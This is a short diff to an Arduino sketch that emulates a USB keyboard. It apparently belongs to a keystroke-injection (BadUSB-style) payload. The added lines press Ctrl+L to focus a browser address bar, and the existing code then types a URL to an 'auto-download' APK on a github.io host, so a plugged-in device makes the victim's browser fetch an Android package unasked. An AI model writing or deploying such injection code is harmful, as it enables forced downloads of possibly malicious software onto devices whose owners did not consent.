@@ -19,6 +19,10 @@ void setup()
   delay(500);
 
   delay(500);
+   
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('l');
+  Keyboard.releaseAll();
 
   Keyboard.print("https://vishal-y.github.io/auto-download/1.apk");
 
